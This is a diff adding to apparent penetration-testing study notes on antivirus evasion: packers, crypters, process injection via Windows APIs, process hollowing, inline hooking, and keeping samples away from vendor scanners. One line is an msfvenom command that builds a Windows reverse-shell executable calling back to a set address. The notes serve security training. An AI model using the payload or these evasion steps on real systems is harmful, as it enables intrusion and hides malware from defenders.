@@ -60,3 +60,66 @@ kali@kali:~$ xxd -b malware.txt
 			- capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples.
 - Windows msfvenom example
 	- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.205 LPORT=5555 -f exe > binary.exe
+
+### On-Disk Evasion
+- packers
+	- reduce the size of an executable
+	- new hash signature and as a result, can effectively bypass older and more simplistic AV scanners
+- Obfuscators
+	- reorganize and mutate code
+	- replacing instructions with semantically equivalent ones, inserting irrelevant instructions or _dead code_,[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/bypassing-antivirus-detections/on-disk-evasion#fn3) splitting or reordering functions
+	- modern ones can run in-memory
+- Crypter
+	- alters executable code, adding a decryption stub that restores the original code upon execution
+	- decryption happens in-memory
+	- encrypted code is the only thing on-disk
+	- most effective
+- anti-reversing
+- anti-debugging
+- virtual machine emulation detection
+- anti-copy
+- The Enigma Protector
+	- commerical tool for bypassing AVs
+### In-Memory Evasion
+- In-memory Injections = PE injections
+- Remote Process Memory Injection
+	- inject the payload into another valid PE that is not malicious
+	1. Windows APIs
+	2. use OpenProcess to obtain a valid HANDLE
+	3. get valid HANDLE to target process we have permissions to
+	4. allocate memory in the context of that process by calling a Windows API such as VirtualAllocEx
+	5. copy malicious payload to newly allocated memory using WriteProcessMemory
+	6. execute in memory in a seperate thread using CreateRemoteThread
+- Reflective DLL Injection
+	- load a DLL stored by the attacker in the process memory
+	- challenge
+		- LoadLibrary does not support in-memory
+		- must write their own version of the API that does not rely on a disk-based DLL
+- Process Hollowing
+	- launch a non-malicious process in a suspended state
+	- the image of the process is removed from memory and replaced with a malicious executable image
+	- the process is then resumed and malicious code is executed instead of the legitimate proces
+- Inline hooking
+		- employed by rootkits
+			- dedicated and persistent access to the target system through modification of system components in user space, kernel, or even at lower OS protection rings13 such as boot or hypervisor
+		
+	- modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code
+	- Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed
+
+### Testing for AV Evasion
+- VirusTotal
+	- *CAUTION* - sends malware signature to other vendors so AVs can be updated
+	- may cause AV to block your new malware
+- AntiScan.Me
+	- claims it does not divulge any samples
+- If TGT environment specifics are known
+	- build a dedicated VM that resembles the customer environment
+	- test
+- Disable AV Automatic Sample Submission in Windows
+	- Windows Security > Virus & threat protection > Manage Settings
+- No internet = some advanced AV features inhibited
+### Thread Injection
+- [[Thread Injection]]
+
+
+
